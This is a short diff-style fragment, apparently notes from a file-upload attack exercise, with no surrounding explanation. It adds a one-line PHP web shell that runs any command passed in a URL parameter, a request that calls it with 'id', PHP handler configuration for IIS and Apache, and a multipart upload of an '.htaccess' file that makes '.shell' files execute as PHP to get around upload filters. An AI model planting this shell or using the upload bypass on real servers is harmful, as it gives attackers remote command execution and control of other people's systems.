@@ -1,0 +1,18 @@
+<?php echo system($_GET['command']); ?>
+GET /example/exploit.php?command=id HTTP/1.1
+
+<staticContent>
+    <mimeMap fileExtension=".json" mimeType="application/json" />
+    <mimeMap fileExtension=".php" mimeType="application/x-php" />
+</staticContent>
+
+
+LoadModule php_module /usr/lib/apache2/modules/libphp.so
+AddType application/x-httpd-php .php
+
+
+------WebKitFormBoundarya6VouMER1IYKmv3E
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: plain/text
+
+AddType application/x-httpd-php .shell
